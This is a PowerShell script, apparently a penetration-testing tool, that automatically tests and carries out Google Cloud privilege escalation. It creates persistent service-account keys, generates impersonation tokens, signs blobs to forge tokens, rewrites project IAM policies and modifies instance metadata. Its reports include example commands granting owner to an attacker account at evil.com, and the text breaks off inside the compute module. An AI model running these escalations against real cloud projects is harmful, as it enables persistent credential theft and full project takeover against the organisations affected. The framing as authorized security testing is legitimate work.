<#
.SYNOPSIS
    GCP Privilege Escalation Tester & Chain Analyzer

.DESCRIPTION
    Consumes the manifest (00_MANIFEST.json) produced by GCP-PenTest-Enumerator.ps1
    and systematically tests, brute-forces, and documents every viable privilege
    escalation path across the target GCP environment.

    For EACH path it:
      1. Probes whether the current identity holds the required permission.
      2. If the permission exists, EXECUTES the escalation (or a safe proof).
      3. Documents the full chain with step-by-step reproduction commands.

    Modes:
      -Mode Probe       Test permissions only; never create or modify resources.
      -Mode Safe        Create SA keys & tokens but do NOT modify IAM, deploy code,
                        or create infrastructure.  (default)
      -Mode Aggressive  Full exploitation: deploys functions, creates VMs, modifies
                        IAM policies.  Use only with explicit written authorization.

    TOOLS REQUIRED: gcloud, gsutil, bq (Google Cloud SDK, Windows / PowerShell)

.PARAMETER EnumDir
    Path to the GCP_PenTest_Output_* directory from the enumerator.

.PARAMETER Mode
    Probe | Safe | Aggressive  (default: Safe)

.PARAMETER TargetProjects
    Optional comma-separated list of project IDs to test (default: all in manifest).

.EXAMPLE
    .\GCP-PrivEsc-Tester.ps1 -EnumDir .\GCP_PenTest_Output_20260223_100000
    .\GCP-PrivEsc-Tester.ps1 -EnumDir .\GCP_PenTest_Output_20260223_100000 -Mode Aggressive
    .\GCP-PrivEsc-Tester.ps1 -EnumDir .\GCP_PenTest_Output_20260223_100000 -TargetProjects "proj-a,proj-b"
#>

param(
    [Parameter(Mandatory = $true)]
    [string]$EnumDir,

    [ValidateSet("Probe", "Safe", "Aggressive")]
    [string]$Mode = "Safe",

    [string]$TargetProjects = ""
)

# ============================================================================
# CONFIGURATION
# ============================================================================
$ErrorActionPreference = "Continue"
$Timestamp             = Get-Date -Format "yyyyMMdd_HHmmss"
$OutputDir             = ".\GCP_PrivEsc_Results_$Timestamp"
$ChainReportFile       = "$OutputDir\00_CHAIN_REPORT.txt"
$ProofFile             = "$OutputDir\00_PROOF_LOG.txt"
$TestLogFile           = "$OutputDir\00_TEST_LOG.txt"
$CrossProjectFile      = "$OutputDir\00_CROSS_PROJECT_CHAINS.txt"
$ChainJsonFile         = "$OutputDir\00_CHAINS.json"
$ErrorLogFile          = "$OutputDir\00_ERRORS.log"
$CreatedArtifactsFile  = "$OutputDir\00_CREATED_ARTIFACTS.txt"

# Script-scoped state
$Script:CreatedArtifacts  = [System.Collections.ArrayList]::new()
$Script:Chains            = [System.Collections.ArrayList]::new()
$Script:PermCache         = @{}
$Script:SARoleCache       = @{}
$Script:ManifestRolePerms = @{}

# PrivEsc permission list (must match enumerator)
$Script:PrivEscPermissions = @(
    "iam.serviceAccounts.actAs",
    "iam.serviceAccounts.getAccessToken",
    "iam.serviceAccounts.getOpenIdToken",
    "iam.serviceAccounts.implicitDelegation",
    "iam.serviceAccounts.signBlob",
    "iam.serviceAccounts.signJwt",
    "iam.serviceAccountKeys.create",
    "iam.roles.update",
    "resourcemanager.projects.setIamPolicy",
    "resourcemanager.folders.setIamPolicy",
    "resourcemanager.organizations.setIamPolicy",
    "compute.instances.setMetadata",
    "compute.projects.setCommonInstanceMetadata",
    "compute.instances.setServiceAccount",
    "compute.instances.create",
    "compute.instances.osLogin",
    "compute.instances.osAdminLogin",
    "cloudfunctions.functions.create",
    "cloudfunctions.functions.update",
    "cloudfunctions.functions.sourceCodeSet",
    "run.services.create",
    "run.services.update",
    "cloudbuild.builds.create",
    "storage.objects.create",
    "storage.objects.setIamPolicy",
    "storage.buckets.setIamPolicy",
    "secretmanager.versions.access",
    "deploymentmanager.deployments.create",
    "composer.environments.create",
    "dataflow.jobs.create",
    "dataproc.clusters.create",
    "orgpolicy.policy.set",
    "serviceusage.services.enable"
)

# ============================================================================
# HELPER FUNCTIONS
# ============================================================================

function Ensure-Dir {
    param([string]$P)
    if (-not (Test-Path $P)) {
        New-Item -ItemType Directory -Path $P -Force | Out-Null
    }
}

function Write-Log {
    param([string]$Msg, [string]$Lvl = "INFO")
    $ts = Get-Date -Format 'HH:mm:ss'
    $line = "[$ts] [$Lvl] $Msg"
    $color = switch ($Lvl) {
        "INFO"  { "Cyan" }
        "TEST"  { "White" }
        "OK"    { "Green" }
        "FAIL"  { "DarkGray" }
        "CHAIN" { "Magenta" }
        "WARN"  { "Yellow" }
        "ERROR" { "Red" }
        "PROOF" { "Green" }
        default { "White" }
    }
    Write-Host $line -ForegroundColor $color
    Add-Content -Path $TestLogFile -Value $line
    if ($Lvl -eq "ERROR") {
        Add-Content -Path $ErrorLogFile -Value $line
    }
}

function Write-Proof {
    param([string]$Text)
    Add-Content -Path $ProofFile -Value $Text
}

function Record-Chain {
    param(
        [string]$ChainID,
        [string]$Project,
        [string]$Title,
        [string]$Severity,
        [string]$InitialAccess,
        [string]$TargetPrivilege,
        [string[]]$Steps,
        [string[]]$Commands,
        [string]$Impact,
        [string]$Proof = ""
    )

    $chain = @{
        id               = $ChainID
        project          = $Project
        title            = $Title
        severity         = $Severity
        initial_access   = $InitialAccess
        target_privilege = $TargetPrivilege
        steps            = $Steps
        commands         = $Commands
        impact           = $Impact
        proof            = $Proof
        timestamp        = (Get-Date -Format 'o')
    }
    [void]$Script:Chains.Add($chain)

    # Build steps text
    $stepsLines = @()
    for ($i = 0; $i -lt $Steps.Count; $i++) {
        $stepNum = $i + 1
        $stepsLines += "  Step $stepNum : $($Steps[$i])"
    }
    $stepsText = $stepsLines -join "`n"

    # Build commands text
    $cmdsLines = @()
    foreach ($c in $Commands) {
        $cmdsLines += "  PS> $c"
    }
    $cmdsText = $cmdsLines -join "`n"

    # Build proof text
    $proofText = if ($Proof) { $Proof } else { "(see proof log for output)" }

    $report = @"

################################################################################
CHAIN $ChainID [$Severity]
################################################################################
Title   : $Title
Project : $Project
Impact  : $Impact

--- INITIAL ACCESS ---
$InitialAccess

--- TARGET PRIVILEGE ---
$TargetPrivilege

--- EXPLOITATION STEPS ---
$stepsText

--- REPRODUCTION COMMANDS ---
$cmdsText

--- PROOF ---
$proofText
################################################################################

"@
    Add-Content -Path $ChainReportFile -Value $report
    Write-Log "CHAIN CONFIRMED: $ChainID - $Title" "CHAIN"
}

function Record-Artifact {
    param([string]$Type, [string]$Project, [string]$Detail)
    $line = "[$(Get-Date -Format 'o')] [$Type] Project=$Project | $Detail"
    [void]$Script:CreatedArtifacts.Add($line)
    Add-Content -Path $CreatedArtifactsFile -Value $line
}

function Run-GcloudRaw {
    param([string]$Cmd)
    try {
        $raw = Invoke-Expression "gcloud $Cmd 2>&1"
        $errParts = @($raw | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] })
        $outParts = @($raw | Where-Object { $_ -isnot [System.Management.Automation.ErrorRecord] })
        $stderr = $errParts -join "`n"
        $stdout = $outParts -join "`n"
        $isErr = $stderr -match "ERROR|PERMISSION_DENIED|403|FORBIDDEN|ACCESS_DENIED|NOT_FOUND|INVALID_ARGUMENT"
        return @{ stdout = $stdout; stderr = $stderr; success = (-not $isErr) }
    }
    catch {
        return @{ stdout = ""; stderr = "$_"; success = $false }
    }
}

function Run-GcloudJson {
    param([string]$Cmd)
    $r = Run-GcloudRaw "$Cmd --format=json"
    if ($r.success -and $r.stdout) {
        try { return ($r.stdout | ConvertFrom-Json) }
        catch { return $null }
    }
    return $null
}

function Save-Output {
    param([string]$FilePath, $Data, [switch]$Append)
    try {
        if ($null -eq $Data) {
            if (-not $Append) { Set-Content -Path $FilePath -Value "# No data returned" }
            return
        }
        $json = $Data | ConvertTo-Json -Depth 20
        if ($Append) {
            Add-Content -Path $FilePath -Value $json
        }
        else {
            Set-Content -Path $FilePath -Value $json
        }
    }
    catch {
        $txt = $Data | Out-String
        if ($Append) {
            Add-Content -Path $FilePath -Value $txt
        }
        else {
            Set-Content -Path $FilePath -Value $txt
        }
    }
}

# ============================================================================
# PERMISSION & ROLE HELPERS
# ============================================================================

function Test-PermissionBatch {
    param([string]$Project)
    Write-Log "  Probing permissions on $Project ..." "TEST"
    $results = @{}

    $r = Run-GcloudRaw "projects get-iam-policy $Project --format=json"
    $results["resourcemanager.projects.getIamPolicy"] = $r.success

    $r = Run-GcloudRaw "iam service-accounts list --project=$Project --format=json"
    $results["iam.serviceAccounts.list"] = $r.success

    $r = Run-GcloudRaw "compute instances list --project=$Project --format=json --limit=1"
    $results["compute.instances.list"] = $r.success

    $r = Run-GcloudRaw "compute project-info describe --project=$Project --format=json"
    $results["compute.projects.get"] = $r.success

    try {
        $gsOut = gsutil ls -p $Project 2>&1
        $gsErr = @($gsOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
        $results["storage.buckets.list"] = (-not ($gsErr -match "AccessDeniedException|403"))
    }
    catch { $results["storage.buckets.list"] = $false }

    $r = Run-GcloudRaw "secrets list --project=$Project --format=json --limit=1"
    $results["secretmanager.secrets.list"] = $r.success

    $r = Run-GcloudRaw "functions list --project=$Project --format=json --limit=1"
    $results["cloudfunctions.functions.list"] = $r.success

    $r = Run-GcloudRaw "run services list --project=$Project --platform=managed --format=json --limit=1"
    $results["run.services.list"] = $r.success

    $r = Run-GcloudRaw "builds list --project=$Project --format=json --limit=1"
    $results["cloudbuild.builds.list"] = $r.success

    try {
        $bqOut = bq ls --project_id=$Project --format=json 2>&1
        $bqErr = @($bqOut | Where-Object { $_ -is [System.Management.Automation.ErrorRecord] }) -join ""
        $results["bigquery.datasets.list"] = (-not ($bqErr -match "Access Denied|403|BigQuery API has not been enabled"))
    }
    catch { $results["bigquery.datasets.list"] = $false }

    $r = Run-GcloudRaw "container clusters list --project=$Project --format=json --limit=1"
    $results["container.clusters.list"] = $r.success

    $r = Run-GcloudRaw "kms keyrings list --location=global --project=$Project --format=json --limit=1"
    $results["cloudkms.keyRings.list"] = $r.success

    $r = Run-GcloudRaw "sql instances list --project=$Project --format=json --limit=1"
    $results["cloudsql.instances.list"] = $r.success

    $r = Run-GcloudRaw "logging sinks list --project=$Project --format=json --limit=1"
    $results["logging.sinks.list"] = $r.success

    if (-not $Script:PermCache.ContainsKey($Project)) { $Script:PermCache[$Project] = @{} }
    foreach ($k in $results.Keys) { $Script:PermCache[$Project][$k] = $results[$k] }
    return $results
}

function Get-SARolesOnProject {
    param([string]$SAEmail, [string]$Project)
    $cacheKey = "${Project}::${SAEmail}"
    if ($Script:SARoleCache.ContainsKey($cacheKey)) {
        return $Script:SARoleCache[$cacheKey]
    }
    $roles = @()
    $projData = $Script:Manifest.projects[$Project]
    if ($projData) {
        foreach ($binding in $projData.iam_bindings) {
            foreach ($member in $binding.members) {
                if ($member -eq "serviceAccount:$SAEmail") {
                    $roles += $binding.role
                }
            }
        }
    }
    $Script:SARoleCache[$cacheKey] = $roles
    return $roles
}

function Get-RolePrivEscPerms {
    param([string]$Role)
    if ($Script:ManifestRolePerms.Count -gt 0 -and $Script:ManifestRolePerms.ContainsKey($Role)) {
        $entry = $Script:ManifestRolePerms[$Role]
        if ($entry.privesc_permissions) {
            return @($entry.privesc_permissions)
        }
        return @()
    }
    try {
        $detail = Run-GcloudJson "iam roles describe $Role"
        if ($detail -and $detail.includedPermissions) {
            $matched = @($detail.includedPermissions | Where-Object { $_ -in $Script:PrivEscPermissions })
            return $matched
        }
    }
    catch { }
    return @()
}

function Format-RolesWithPerms {
    param([string[]]$Roles)
    $parts = @()
    foreach ($r in $Roles) {
        $perms = Get-RolePrivEscPerms -Role $r
        if ($perms.Count -gt 0) {
            $permList = $perms -join ', '
            $parts += "$r [privesc: $permList]"
        }
        else {
            $parts += $r
        }
    }
    return ($parts -join "; ")
}

function Test-SAKeyCreateFromBindings {
    param([string]$Project, [string]$SAEmail)
    $keyCreateRoles = @(
        "roles/owner",
        "roles/editor",
        "roles/iam.serviceAccountKeyAdmin",
        "roles/iam.serviceAccountAdmin"
    )
    $callerAccount = $Script:Manifest.caller_account
    $projData = $Script:Manifest.projects[$Project]
    if (-not $projData) { return $false }

    foreach ($binding in $projData.iam_bindings) {
        if ($binding.role -in $keyCreateRoles) {
            foreach ($member in $binding.members) {
                if ($member -match [regex]::Escape($callerAccount)) { return $true }
                if ($member -eq "allUsers" -or $member -eq "allAuthenticatedUsers") { return $true }
            }
        }
    }
    return $false
}


# ============================================================================
# ============================================================================
#
#   PRIVILEGE ESCALATION TEST MODULES
#
# ============================================================================
# ============================================================================

# ---------- Module 1: SA Key Creation Brute-Force ----------
function Test-SAKeyCreation {
    param([string]$Project, $SAs)
    $dir = "$OutputDir\$Project\sa_key_creation"
    Ensure-Dir $dir

    Write-Log "  [SA-KEYS] Testing key creation for $($SAs.Count) service accounts..." "TEST"

    $chainNum = 0
    foreach ($sa in $SAs) {
        $saEmail = $sa.email
        Write-Log "    Testing iam.serviceAccountKeys.create on $saEmail" "TEST"

        if ($Mode -eq "Probe") {
            $hasRole = Test-SAKeyCreateFromBindings -Project $Project -SAEmail $saEmail
            if ($hasRole) {
                Write-Log "    LIKELY POSSIBLE: Key creation on $saEmail (role-based inference)" "OK"
            }
            continue
        }

        # Safe / Aggressive: actually attempt key creation
        $safeEmail = $saEmail -replace '[^a-zA-Z0-9]', '_'
        $keyFile = "$dir\sa_key_$safeEmail.json"
        $r = Run-GcloudRaw "iam service-accounts keys create `"$keyFile`" --iam-account=$saEmail --project=$Project"

        if ($r.success -and (Test-Path $keyFile)) {
            $chainNum++
            $chainID = "SAKEY-$Project-$chainNum"

            Record-Artifact -Type "SA_KEY" -Project $Project -Detail "Created key for $saEmail at $keyFile"

            $saRoles = Get-SARolesOnProject -SAEmail $saEmail -Project $Project
            if ($saRoles -and $saRoles.Count -gt 0) {
                $rolesStr = Format-RolesWithPerms -Roles $saRoles
            }
            else {
                $rolesStr = "(unknown - enumerate with activated key)"
            }

            $isDefault = $saEmail -match "\d+-compute@developer|@appspot\.gserviceaccount|@cloudbuild\.gserviceaccount"
            $isPriv = $saRoles -match "owner|editor|admin"
            $severity = if ($isDefault -or $isPriv) { "CRITICAL" } else { "HIGH" }

            $defaultNote = ""
            if ($isDefault) {
                $defaultNote = "This is a DEFAULT service account which typically has Editor role, granting near-full project control."
            }

            $steps = @(
                "Current identity can create keys for service account $saEmail",
                "A JSON key file was created, granting persistent authentication as this SA",
                "The SA has the following roles on the project: $rolesStr",
                "This key never expires unless explicitly deleted and grants full SA privileges"
            )
            $commands = @(
                "gcloud iam service-accounts keys create key.json --iam-account=$saEmail --project=$Project",
                "gcloud auth activate-service-account --key-file=key.json",
                "gcloud projects get-iam-policy $Project --flatten=`"bindings[].members`" --filter=`"bindings.members:serviceAccount:$saEmail`" --format=`"table(bindings.role)`""
            )

            Record-Chain -ChainID $chainID -Project $Project `
                -Title "SA Key Created: $saEmail" `
                -Severity $severity `
                -InitialAccess "Current identity has iam.serviceAccountKeys.create permission on $saEmail" `
                -TargetPrivilege "Persistent credential as $saEmail (roles: $rolesStr)" `
                -Steps $steps `
                -Commands $commands `
                -Impact "Persistent credential theft. Attacker can authenticate as $saEmail indefinitely. $defaultNote" `
                -Proof "Key file created at: $keyFile"

            Write-Proof "[$chainID] SA Key created for $saEmail`nStored at: $keyFile`nRoles: $rolesStr`n"
        }
        else {
            Write-Log "    DENIED: Cannot create key for $saEmail" "FAIL"
        }
    }
}


# ---------- Module 2: SA Token Impersonation Brute-Force ----------
function Test-SAImpersonation {
    param([string]$Project, $SAs)
    $dir = "$OutputDir\$Project\sa_impersonation"
    Ensure-Dir $dir

    Write-Log "  [SA-IMPERSONATE] Testing token generation for $($SAs.Count) SAs..." "TEST"

    $chainNum = 0
    foreach ($sa in $SAs) {
        $saEmail = $sa.email
        Write-Log "    Testing getAccessToken / signBlob on $saEmail" "TEST"

        if ($Mode -eq "Probe") { continue }

        # --- Test 1: getAccessToken ---
        $r = Run-GcloudRaw "auth print-access-token --impersonate-service-account=$saEmail"
        if ($r.success -and $r.stdout -match "^ya29\.") {
            $chainNum++
            $chainID = "IMPERSONATE-$Project-$chainNum"
            $tokenLen = [math]::Min(20, $r.stdout.Length)
            $token = $r.stdout.Substring(0, $tokenLen) + "...[REDACTED]"

            $saRoles = Get-SARolesOnProject -SAEmail $saEmail -Project $Project
            if ($saRoles -and $saRoles.Count -gt 0) {
                $rolesStr = Format-RolesWithPerms -Roles $saRoles
            }
            else {
                $rolesStr = "(enumerate with token)"
            }

            $isDefault = $saEmail -match "\d+-compute@developer|@appspot\.gserviceaccount|@cloudbuild\.gserviceaccount"
            $isPriv = $saRoles -match "owner|editor|admin"
            $severity = if ($isDefault -or $isPriv) { "CRITICAL" } else { "HIGH" }

            $defaultNote = ""
            if ($isDefault) {
                $defaultNote = "DEFAULT SA - likely has Editor role on the entire project."
            }

            $steps = @(
                "Current identity can generate access tokens for $saEmail",
                "Token generated successfully (short-lived, ~1 hour, but renewable)",
                "All API calls made with this token execute as $saEmail",
                "SA roles on this project: $rolesStr"
            )
            $commands = @(
                "# Generate access token",
                "gcloud auth print-access-token --impersonate-service-account=$saEmail",
                "",
                "# Use impersonation in any gcloud command",
                "gcloud compute instances list --project=$Project --impersonate-service-account=$saEmail",
                "gcloud projects get-iam-policy $Project --impersonate-service-account=$saEmail",
                "",
                "# Chain: if this SA can impersonate ANOTHER SA (delegation)",
                "gcloud auth print-access-token --impersonate-service-account=HIGHER_PRIV_SA --delegates=$saEmail"
            )

            Record-Chain -ChainID $chainID -Project $Project `
                -Title "SA Impersonation via getAccessToken: $saEmail" `
                -Severity $severity `
                -InitialAccess "Current identity has iam.serviceAccounts.getAccessToken on $saEmail (via roles/iam.serviceAccountTokenCreator or equivalent)" `
                -TargetPrivilege "Short-lived OAuth2 token as $saEmail (roles: $rolesStr)" `
                -Steps $steps `
                -Commands $commands `
                -Impact "Identity impersonation. Attacker operates as $saEmail for any GCP API. $defaultNote" `
                -Proof "Token prefix: $token"

            Write-Proof "[$chainID] Access token obtained for $saEmail`nToken prefix: $token`nRoles: $rolesStr`n"
            $safeEmail = $saEmail -replace '[^a-zA-Z0-9]', '_'
            Save-Output "$dir\token_$safeEmail.txt" "Token obtained. Prefix: $token"
        }
        else {
            Write-Log "    DENIED: getAccessToken for $saEmail" "FAIL"
        }

        # --- Test 2: signBlob ---
        $safeEmail = $saEmail -replace '[^a-zA-Z0-9]', '_'
        $signFile = "$dir\signblob_test_$safeEmail.txt"
        $tempIn = "$dir\_signblob_input.tmp"
        Set-Content -Path $tempIn -Value "pentest-probe" -NoNewline
        $r = Run-GcloudRaw "iam service-accounts sign-blob $tempIn $signFile --iam-account=$saEmail"
        Remove-Item $tempIn -ErrorAction SilentlyContinue

        if ($r.success -and (Test-Path $signFile)) {
            $chainNum++
            $chainID = "SIGNBLOB-$Project-$chainNum"

            $steps = @(
                "Current identity can sign blobs as $saEmail",
                "This allows crafting a self-signed JWT and exchanging it for an access token",
                "The forged token grants full $saEmail privileges",
                "This is equivalent to getAccessToken but bypasses some audit logging"
            )
            $commands = @(
                "# Sign a blob as the SA",
                "echo 'payload' > input.txt",
                "gcloud iam service-accounts sign-blob input.txt signed.txt --iam-account=$saEmail",
                "",
                "# To forge an access token:",
                "# 1. Construct a JWT with header={alg:RS256,typ:JWT}",
                "#    payload={iss:$saEmail, scope:'https://www.googleapis.com/auth/cloud-platform',",
                "#             aud:'https://oauth2.googleapis.com/token', iat:<now>, exp:<now+3600>}",
                "# 2. Sign the JWT using sign-blob",
                "# 3. POST to https://oauth2.googleapis.com/token with grant_type=urn:ietf:params:oauth:grant-type:jwt-bearer"
            )

            Record-Chain -ChainID $chainID -Project $Project `
                -Title "SA signBlob Capability: $saEmail" `
                -Severity "HIGH" `
                -InitialAccess "Current identity has iam.serviceAccounts.signBlob on $saEmail" `
                -TargetPrivilege "Can sign arbitrary payloads as $saEmail - enables forging access tokens and OpenID Connect tokens" `
                -Steps $steps `
                -Commands $commands `
                -Impact "Token forgery. Attacker can create access tokens as $saEmail without direct impersonation, potentially evading detection." `
                -Proof "Signed blob output at: $signFile"

            Write-Proof "[$chainID] signBlob succeeded for $saEmail`nOutput: $signFile`n"
            Record-Artifact -Type "SIGN_BLOB" -Project $Project -Detail "Signed blob for $saEmail"
        }
        else {
            Write-Log "    DENIED: signBlob for $saEmail" "FAIL"
            Remove-Item $signFile -ErrorAction SilentlyContinue
        }
    }
}


# ---------- Module 3: IAM Policy Modification ----------
function Test-IAMPolicyModification {
    param([string]$Project)
    $dir = "$OutputDir\$Project\iam_modification"
    Ensure-Dir $dir

    Write-Log "  [IAM-SETPOLICY] Testing setIamPolicy on $Project ..." "TEST"

    $policy = Run-GcloudJson "projects get-iam-policy $Project"
    if (-not $policy) {
        Write-Log "    Cannot read IAM policy - setIamPolicy test skipped" "FAIL"
        return
    }
    Save-Output "$dir\current_policy.json" $policy

    # Check if our identity has roles that include setIamPolicy
    $callerAccount = $Script:Manifest.caller_account
    $setIamRoles = @("roles/owner", "roles/resourcemanager.projectIamAdmin", "roles/iam.securityAdmin")
    $hasPotentialSetIam = $false
    $matchedRole = ""

    foreach ($binding in $policy.bindings) {
        if ($binding.role -in $setIamRoles) {
            foreach ($member in $binding.members) {
                $isCallerMatch = $member -match [regex]::Escape($callerAccount)
                $isPublic = ($member -eq "allUsers" -or $member -eq "allAuthenticatedUsers")
                if ($isCallerMatch -or $isPublic) {
                    $hasPotentialSetIam = $true
                    $matchedRole = $binding.role
                    break
                }
            }
        }
        if ($hasPotentialSetIam) { break }
    }

    # Also check custom roles
    if (-not $hasPotentialSetIam) {
        $projData = $Script:Manifest.projects[$Project]
        if ($projData -and $projData.custom_roles) {
            foreach ($cr in $projData.custom_roles) {
                $safeCrTitle = $cr.title -replace '[^a-zA-Z0-9]', '_'
                $crFile = "$EnumDir\$Project\iam\custom_role_$safeCrTitle.json"
                if (Test-Path $crFile) {
                    $crData = Get-Content $crFile -Raw | ConvertFrom-Json
                    if ($crData.includedPermissions -contains "resourcemanager.projects.setIamPolicy") {
                        foreach ($binding in $policy.bindings) {
                            if ($binding.role -eq $cr.name) {
                                foreach ($member in $binding.members) {
                                    if ($member -match [regex]::Escape($callerAccount)) {
                                        $hasPotentialSetIam = $true
                                        $matchedRole = $cr.name
                                        break
                                    }
                                }
                            }
                        }
                    }
                }
                if ($hasPotentialSetIam) { break }
            }
        }
    }

    if ($hasPotentialSetIam) {
        Write-Log "    POTENTIAL setIamPolicy via role: $matchedRole" "OK"
        $matchedRolePerms = Get-RolePrivEscPerms -Role $matchedRole
        $matchedRolePermStr = ""
        if ($matchedRolePerms.Count -gt 0) {
            $matchedRolePermStr = "Role privesc permissions: " + ($matchedRolePerms -join ', ')
        }

        if ($Mode -eq "Aggressive") {
            Write-Log "    [AGGRESSIVE] Testing actual setIamPolicy write..." "WARN"
            $tempPolicyFile = "$dir\test_policy_write.json"
            $policy | ConvertTo-Json -Depth 20 | Set-Content $tempPolicyFile
            $r = Run-GcloudRaw "projects set-iam-policy $Project `"$tempPolicyFile`" --format=json"

            if ($r.success) {
                $chainID = "SETIAMPOLICY-$Project"
                $steps = @(
                    "Current identity is bound to $matchedRole on project $Project",
                    "This role includes resourcemanager.projects.setIamPolicy",
                    $matchedRolePermStr,
                    "setIamPolicy write was tested and CONFIRMED by re-applying the current policy",
                    "An attacker could add roles/owner for their own account or any service account",
                    "This is a FULL PROJECT COMPROMISE - any role can be granted to any identity"
                )
                $commands = @(
                    "# Read current policy",
                    "gcloud projects get-iam-policy $Project --format=json > policy.json",
                    "",
                    "# Add owner role for attacker (EXAMPLE - this would be the attack)",
                    "# Edit policy.json to add: {role: 'roles/owner', members: ['user:attacker@evil.com']}",
                    "",
                    "# Apply modified policy",
                    "gcloud projects set-iam-policy $Project policy.json",
                    "",
                    "# Or use add-iam-policy-binding shortcut:",
                    "gcloud projects add-iam-policy-binding $Project --member='user:attacker@evil.com' --role='roles/owner'"
                )
                Record-Chain -ChainID $chainID -Project $Project `
                    -Title "Project IAM Policy Write Access CONFIRMED" `
                    -Severity "CRITICAL" `
                    -InitialAccess "Current identity has $matchedRole which includes resourcemanager.projects.setIamPolicy. $matchedRolePermStr" `
                    -TargetPrivilege "Can grant ANY role to ANY identity on project $Project - full project takeover" `
                    -Steps $steps `
                    -Commands $commands `
                    -Impact "FULL PROJECT TAKEOVER. Attacker can grant themselves Owner, read all secrets, control all resources, create persistent backdoors via SA keys, and pivot to any connected project." `
                    -Proof "setIamPolicy write succeeded (unmodified policy re-applied)"

                Write-Proof "[SETIAMPOLICY-$Project] setIamPolicy confirmed via role $matchedRole | $matchedRolePermStr`n"
            }
            else {
                Write-Log "    setIamPolicy write DENIED despite having $matchedRole (org policy constraint?)" "WARN"
            }
        }
        else {
            # Probe / Safe mode
            $chainID = "SETIAMPOLICY-$Project"
            $steps = @(
                "Current identity is bound to $matchedRole on project $Project",
                "This role includes resourcemanager.projects.setIamPolicy",
                $matchedRolePermStr,
                "NOTE: Write not tested in $Mode mode - use -Mode Aggressive to confirm",
                "If write succeeds, this is a full project compromise"
            )
            $commands = @(
                "# To confirm (CAUTION - modifies IAM):",
                "gcloud projects get-iam-policy $Project --format=json > policy.json",
                "gcloud projects set-iam-policy $Project policy.json"
            )
            Record-Chain -ChainID $chainID -Project $Project `
                -Title "Project IAM Policy Write Access LIKELY (role: $matchedRole)" `
                -Severity "CRITICAL" `
                -InitialAccess "Current identity has $matchedRole which includes resourcemanager.projects.setIamPolicy. $matchedRolePermStr" `
                -TargetPrivilege "Can likely grant ANY role to ANY identity on project $Project" `
                -Steps $steps `
                -Commands $commands `
                -Impact "POTENTIAL FULL PROJECT TAKEOVER. Requires Aggressive mode test to confirm." `
                -Proof "Role $matchedRole detected on current identity (write not attempted in $Mode mode)"
        }
    }
    else {
        Write-Log "    No setIamPolicy capability detected via role analysis" "FAIL"
    }
}


# ---------- Module 4: Custom Role Escalation ----------
function Test-CustomRoleEscalation {
    param([string]$Project, $CustomRoles)
    if (-not $CustomRoles -or $CustomRoles.Count -eq 0) { return }
    $dir = "$OutputDir\$Project\custom_role_escalation"
    Ensure-Dir $dir

    Write-Log "  [CUSTOM-ROLE] Testing iam.roles.update on $($CustomRoles.Count) custom roles..." "TEST"

    foreach ($cr in $CustomRoles) {
        $roleName = $cr.name
        Write-Log "    Testing update on $roleName" "TEST"

        $roleDetail = Run-GcloudJson "iam roles describe $roleName --project=$Project"
        if (-not $roleDetail) { continue }
        $safeCrTitle = $cr.title -replace '[^a-zA-Z0-9]', '_'
        Save-Output "$dir\role_${safeCrTitle}_current.json" $roleDetail

        # Check if caller might have iam.roles.update
        $callerAccount = $Script:Manifest.caller_account
        $updateRoles = @("roles/owner", "roles/iam.roleAdmin", "roles/iam.organizationRoleAdmin")
        $projData = $Script:Manifest.projects[$Project]
        $canUpdate = $false
        if ($projData) {
            foreach ($binding in $projData.iam_bindings) {
                if ($binding.role -in $updateRoles) {
                    foreach ($m in $binding.members) {
                        if ($m -match [regex]::Escape($callerAccount)) {
                            $canUpdate = $true
                            break
                        }
                    }
                }
                if ($canUpdate) { break }
            }
        }

        if ($canUpdate) {
            $existingPerms = @()
            if ($roleDetail.includedPermissions) {
                $existingPerms = @($roleDetail.includedPermissions)
            }
            $existingPrivEsc = @($existingPerms | Where-Object { $_ -in $Script:PrivEscPermissions })

            if ($existingPrivEsc.Count -gt 0) {
                $privEscList = $existingPrivEsc -join ', '
                $existingPermStr = "Current privesc permissions ($($existingPrivEsc.Count)): $privEscList"
            }
            else {
                $existingPermStr = "Currently has $($existingPerms.Count) permissions (none are direct privesc permissions yet)"
            }

            $roleShort = ($roleName -split '/')[-1]
            $chainID = "CUSTOMROLE-$Project-$safeCrTitle"
            $steps = @(
                "Custom role $roleName exists with title '$($cr.title)'",
                "Role currently has $($existingPerms.Count) permissions total",
                $existingPermStr,
                "Current identity has a role granting iam.roles.update",
                "Attacker can add dangerous permissions to this custom role",
                "Any user/SA already bound to this role automatically inherits the new permissions"
            )
            $commands = @(
                "# Add setIamPolicy permission to the custom role",
                "gcloud iam roles update $roleShort --project=$Project --add-permissions=resourcemanager.projects.setIamPolicy",
                "",
                "# Or add SA impersonation",
                "gcloud iam roles update $roleShort --project=$Project --add-permissions=iam.serviceAccounts.actAs,iam.serviceAccounts.getAccessToken"
            )

            Record-Chain -ChainID $chainID -Project $Project `
                -Title "Custom Role Update Possible: $($cr.title)" `
                -Severity "HIGH" `
                -InitialAccess "Current identity likely has iam.roles.update" `
                -TargetPrivilege "Can add any permission (e.g., setIamPolicy, actAs) to custom role $roleName. $existingPermStr" `
                -Steps $steps `
                -Commands $commands `
                -Impact "Privilege escalation via custom role modification. Any identity bound to $roleName gains the injected permissions. This is stealthy because no new role bindings are created."
        }
    }
}


# ---------- Module 5: Compute Instance Metadata Abuse ----------
function Test-ComputeAbuse {
    param([string]$Project, $Instances, $SAs)
    if (-not $Instances -or $Instances.Count -eq 0) { return }
    $dir = "$OutputDir\$Project\compute_abuse"
    Ensure-Dir $dir

    Write-Log "  [COMPUTE] Testing metadata manipulation & instance creation for $($Instances.Count) instances..." "TEST"

    $chainNum = 0
    foreach ($inst in $Instances) {
        $name = $inst.name
        $zone = $inst.zone
        $instSA = $inst.sa
        $scopes = $inst.scopes

        if ($Mode -eq "Aggressive") {
            Write-Log "    [AGGRESSIVE] Testing setMetadata on $name ($zone)" "WARN"

            $r = Run-GcloudJson "compute instances describe $name --zone=$zone --project=$Project"
            if ($r) {
                Save-Output "$dir\instance_$name.json" $r

                $probeTs = Get-Date -Format 'yyyyMMddHHmmss'
                $testR = Run-GcloudRaw "compute instances add-metadata $name --zone=$zone --project=$Project --metadata=pentest-probe-key=probe-$probeTs"
                if ($testR.success) {
                    $chainNum++
                    $chainID = "COMPUTE-META-$Project-$chainNum"
                    Record-Artifact -Type "METADATA" -Project $Project -Detail "Added metadata key 'pentest-probe-key' to instance $name"

                    # Build SA context string
                    if ($instSA) {
